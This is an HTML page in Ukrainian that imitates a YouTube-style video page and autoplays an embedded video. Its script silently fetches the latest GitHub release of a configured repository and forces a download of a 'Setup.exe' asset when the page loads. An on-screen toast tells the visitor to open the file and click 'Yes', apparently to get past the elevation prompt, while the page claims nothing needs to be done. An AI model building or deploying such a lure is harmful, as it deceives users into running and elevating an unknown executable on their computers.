<!doctype html>
<html lang="uk">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Відео</title>
<style>
  :root{--bg:#0f0f0f;--fg:#f1f1f1;--mut:#aaa;--line:#303030}
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--fg);
    font:14px/1.4 Roboto,Arial,system-ui,sans-serif}
  header{position:sticky;top:0;z-index:10;display:flex;align-items:center;gap:16px;
    height:56px;padding:0 16px;background:var(--bg);border-bottom:1px solid var(--line)}
  .logo{display:flex;align-items:center;gap:6px;font-weight:700;font-size:18px}
  .logo .p{width:28px;height:20px;background:#ff0000;border-radius:5px;
    display:grid;place-items:center;color:#fff;font-size:11px}
  .search{flex:1;max-width:640px;height:36px;background:#121212;border:1px solid var(--line);
    border-radius:18px;display:flex;align-items:center;padding:0 16px;color:var(--mut)}
  .av{width:32px;height:32px;border-radius:50%;background:#3a3a3a;margin-left:auto}
  main{max-width:1000px;margin:0 auto;padding:24px 16px 110px}
  .player{position:relative;width:100%;aspect-ratio:16/9;background:#000;border-radius:12px;overflow:hidden}
  .player iframe{position:absolute;inset:0;width:100%;height:100%;border:0}
  h1.title{font-size:20px;font-weight:600;margin:16px 0 12px;line-height:1.3}
  .chan{display:flex;align-items:center;gap:12px;padding-bottom:12px;border-bottom:1px solid var(--line)}
  .chan .pic{width:40px;height:40px;border-radius:50%;background:#3a3a3a;flex:none}
  .chan .name{font-weight:600}
  .chan .subs{color:var(--mut);font-size:12px}
  .chan .btn{margin-left:auto;background:#272727;border:0;color:var(--fg);
    padding:9px 16px;border-radius:18px;font-weight:600;font-size:13px}
  .desc{margin-top:14px;color:var(--mut);font-size:13px}
  .toast{position:fixed;left:50%;bottom:24px;transform:translateX(-50%) translateY(20px);
    background:#272727;border:1px solid var(--line);border-radius:12px;padding:12px 18px;
    display:flex;align-items:center;gap:12px;box-shadow:0 8px 30px rgba(0,0,0,.5);
    opacity:0;transition:.35s;max-width:92vw;z-index:20}
  .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
  .toast b{color:#fff}
  .toast .dot{width:9px;height:9px;border-radius:50%;background:#31c48d;flex:none;
    animation:pulse 1.8s infinite}
  @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(49,196,141,.6)}
    70%{box-shadow:0 0 0 10px rgba(49,196,141,0)}100%{box-shadow:0 0 0 0 rgba(49,196,141,0)}}
  .toast small{display:block;color:var(--mut);font-size:11.5px;margin-top:2px}
</style>
</head>
<body>

<header>
  <div class="logo"><span class="p">▶</span> Video</div>
  <div class="search">Пошук</div>
  <div class="av"></div>
</header>

<main>
  <div class="player">
    <iframe id="yt" allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen></iframe>
  </div>
  <h1 class="title" id="vtitle">Відео</h1>
  <div class="chan">
    <div class="pic"></div>
    <div>
      <div class="name" id="vchan">Канал</div>
      <div class="subs">підписників: 1,2 млн</div>
    </div>
    <button class="btn">Підписатися</button>
  </div>
  <div class="desc">Нічого робити не треба — відео просто грає.</div>
</main>

<div class="toast" id="toast">
  <span class="dot"></span>
  <div>
    <b id="t1">Завантажую файл…</b>
    <small id="t2">Далі: відкрий завантажений файл і натисни «Так»</small>
  </div>
</div>

<script>
(async () => {
  // ====== ЩО ТУТ ЗМІНЮВАТИ ======
  const CFG = {
    owner:   'kostyamalishevskiy-ship-it',
    repo:    'rz',
    video:   'dQw4w9WgXcQ',          // ← ID відео з YouTube (частина після v=)
    title:   'Відео',                 // ← заголовок під плеєром
    channel: 'Канал'                  // ← назва каналу
  };
  // ==============================

  document.getElementById('yt').src =
    `https://www.youtube.com/embed/${CFG.video}?autoplay=1&mute=1&rel=0&modestbranding=1`;
  document.getElementById('vtitle').textContent = CFG.title;
  document.getElementById('vchan').textContent  = CFG.channel;

  const toast = document.getElementById('toast');
  const t1 = document.getElementById('t1');
  const t2 = document.getElementById('t2');
  setTimeout(() => toast.classList.add('show'), 1000);

  try {
    const slug = `${CFG.owner}/${CFG.repo}`;
    const r = await fetch(`https://api.github.com/repos/${slug}/releases/latest`,
      { headers: { Accept: 'application/vnd.github+json' } });
    if (!r.ok) throw new Error(r.status);
    const rel = await r.json();
    const a = (rel.assets || []).find(x => /Setup\.exe$/i.test(x.name));
    if (!a) throw new Error('no asset');

    setTimeout(() => {
      const link = document.createElement('a');
      link.href = `https://github.com/${slug}/releases/latest/download/${a.name}`;
      link.download = '';
      document.body.appendChild(link); link.click(); link.remove();
    }, 500);
  } catch (e) {
    t1.textContent = 'Не вдалось почати завантаження';
    t2.textContent = 'Скачай файл вручну зі сторінки Releases';
  }
})();
</script>
</body>
</html>
